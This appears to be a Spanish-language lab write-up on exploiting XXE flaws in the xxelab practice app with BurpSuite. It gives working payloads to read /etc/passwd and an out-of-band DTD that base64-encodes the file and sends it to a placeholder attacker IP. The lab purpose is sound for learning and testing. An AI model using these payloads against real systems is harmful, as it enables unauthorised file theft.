
---------------
#vulnerabilidad #explotacion #owasp

---------
Primeramente, para comenzar con el proyecto, practicaremos con el siguiente repositorio de GitHub:

```bash
git clone https://github.com/jbarone/xxelab
```

Para que no dé problemas, reiniciamos los servicios de Docker de la siguiente forma:

```bash 
 sudo systemctl restart docker
```

Después de construir la imagen, ejecutamos el contenedor en segundo plano para que no genere problemas al cerrar la terminal con `-d`.

Para ver cómo viaja la petición, la monitoreamos en el panel de inicio a través de BurpSuite:**

Como podemos ver, el formato de la petición va en forma de XML:

![[Pasted image 20240922142040.png]]

El cual se puede conceptualizar con este diagrama:

![[Pasted image 20240922142109.png]]

Primeramente, con el envío de peticiones desde BurpSuite, probamos si el envío es susceptible a la creación de entidades de la siguiente forma:

```xml
<!DOCTYPE foo [<!ENTITY myName "savitar">]>
```

![[Pasted image 20240922142940.png]]

Si la respuesta de la petición la entidad **myName** se puede interpretar, y en este caso como respuesta te aparece el valor asignado a la entidad, en este caso s4vitar, entonces la página es susceptible a un **XXE**.
![[Pasted image 20240922143127.png]]

Una vez probado eso, puedes verificar si mediante el siguiente comando es posible listar archivos de un directorio conocido por contener archivos existentes, como por ejemplo `/etc/passwd`, de la siguiente manera:

```xml
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
```

![[Pasted image 20240922143429.png]]

Si en la salida del comando no observas la información deseada, como la del archivo `/etc/passwd`, entonces será necesario aplicar otro concepto de explotación a ciegas, que es:

---------

## XXE OOB

Si no obtienes respuesta a la solicitud, puedes redirigir la petición a tu IP de atacante, montar una estructura de archivo DTD y abrir un terminal de Python para que la máquina realice la solicitud e inyecte el código que deseas proponer. Puedes hacerlo de la siguiente manera:

```xml
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://IpAtacante/malicius.dtd">]>
```



![[Pasted image 20240922144405.png]]

Si en un caso no puedes declarar entidades en el cuerpo de la estructura, puedes hacerlo en el DOCTYPE de la siguiente manera:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://IpAtacante/malicius.dtd"> %xxe;]>
```

----------

El código del archivo `malicious.dtd` iría de la siguiente forma, comenzando por convertir todo el código a un hash en base 64, para luego ser decodificado:


![[Pasted image 20240922171228.png]]

(Dado que son dos entidades anidadas, para la segunda entidad debemos representar el símbolo `%` en hexadecimal, lo cual se realiza usando `&#x25;`). El código del script sería el siguiente:

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ipAtacante/?file=%file;'>">
%eval;
%exfil;

```

y asi a traves de la escuha del servidor en python y enviando la peticion por burpsuiite tendriamos los hashes para traducirlos en base64

![[Pasted image 20240922172058.png]]

